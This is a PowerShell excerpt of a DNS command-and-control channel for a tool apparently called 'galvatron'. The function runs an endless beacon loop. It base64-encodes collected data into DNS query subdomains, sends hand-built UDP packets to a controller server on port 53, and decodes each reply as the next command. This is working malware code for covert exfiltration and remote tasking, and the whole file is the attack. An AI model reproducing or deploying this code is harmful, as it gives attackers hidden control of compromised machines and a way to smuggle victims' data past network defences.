#excerpt of the DNS c2 for galvatron
function SendDNSPacket
{
    param($server="192.168.1.2")
    
    While ($true)
    {
        $p = pc
        $pc = en64 $p $false
        $idu = idu
        $gostr=""
        $d=1
        if ($global:data.Length -gt 0)
        { 
            Write-Host $global:data
            $data = en64 $global:data $false
            $comm = en64 $global:comm $false
            if ($data.Length -gt 32)
            {
                $datalen=$data.Length / 32
                $d1=$data.Length
                $d =[math]::ceiling($datalen)
                #$d_64 = en64 $d $false
                for($i=0;$i -lt $d;$i++)
                {
                    $min=($i*32)
                    $max=32
                    if ($i -eq ($d-1))
                    {
                        $max = $d1 - $min-1
                    }
                    #Write-Host $min
                    #Write-Host $max
                    $xyz = $data.Substring($min,$max)
                    #Write-Host $i
                    #Write-Host $xyz
                    $gostr += "$comm.$xyz.$pc.$idu.idu.com`n"
                }
            }
            else
            {
                $datalen = 1
                $gostr="$comm.$d_64.$d.$data.$pc.$idu.idu.com"
            }
        }
        else
        {
            $gostr= "$pc.$idu.idu.com"
        }
        $gostrs=$gostr.split("`n")
        
        $udphost=$server
        $udpport=53
        
        $addr = [System.Net.IPAddress]::Parse($udphost)
                      #Trans ID  std query  
        [Byte[]]$Mess=0x00,0x01,0x01,0x00,0x00
                      #Ans       Auth    Add RR
        [Byte[]]$Mess2= 0x00,0x00,0x00
                                  #no. of questions
        $Mess = $Mess + [Bitconverter]::GetBytes([int]$d) +$Mess2 
        
        
        
        #Create Socket!!!
        $Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
        $Stype = [System.Net.Sockets.SocketType]::Dgram
        $Ptype = [System.Net.Sockets.ProtocolType]::UDP
        $enc = [system.Text.Encoding]::UTF8
        [Byte[]]$fullQ = @() 
         
        #suffix for each q
        #        null     type    class 
        $postS = 0x00,0x00,0x01,0x00,0x01     
        foreach ($go1 in $gostrs)
        {
            if ($go1.Length -gt 0)
            {
                Write-Host $go1
                $subds = $go1.Split('.')
            
                foreach ($s in $subds)
                {
                    $data1 = $enc.GetBytes($s) 
                    $len1 = [bitconverter]::GetBytes($s.Length)
                    $len1 = @($len1[0])
                    
                    $fullQ += $len1 + $data1 
                    #Write-Host $fullQ
                }
                $fullQ += $postS
             }
        }
            $End = New-Object System.Net.IPEndPoint $addr, $udpport;
        	$Sock = New-Object System.Net.Sockets.Socket $Saddrf, $Stype, $Ptype;
        	$Sock.TTL = 26
            $Sock.ReceiveTimeout=3000

        	#connect to socket
        	$Sock.Connect($End);

        	#Conn to socket
        	$Enc = [System.Text.Encoding]::ASCII;
            #[Byte[]]$post = 0x00,0x00,0x01,0x00,0x01 
        	$Buffer = $Mess + $fullQ # + $post #$Enc.GetBytes($Mess);
            #Write-Host $enc.GetString($Buffer)
        	#Send the buffer
            
            
        	
        	$Sent = $Sock.Send($Buffer);
            [byte[]]$buffer2=@(0)*4096
            $Recv = $Sock.Receive($buffer2)
            #Write-Host "$Recv: $buffer2"
            $StartB = $gostrs[0].Length+31
            [int]$diff = [int]$Recv - $StartB
            
            $diff
            [Byte[]]$catch1 = @(0)*$diff
            for($i=0; $i -lt $diff; $i++)
            {
                    $catch1[$i] = $buffer2[$StartB+ $i]
            }
            #Write-Host "$catch1"
            $output1 =$enc.GetString($catch1)
            
            $Sock.Close();
            $fullQ=$null
            $output1 = $output1.trim("")
            $output1 = $output1.trim("`"")
            $c64 = de64 $output1 $false               #de-obfuscate
            getText $c64
            $c64
        
        Start-Sleep $dwell
    }
}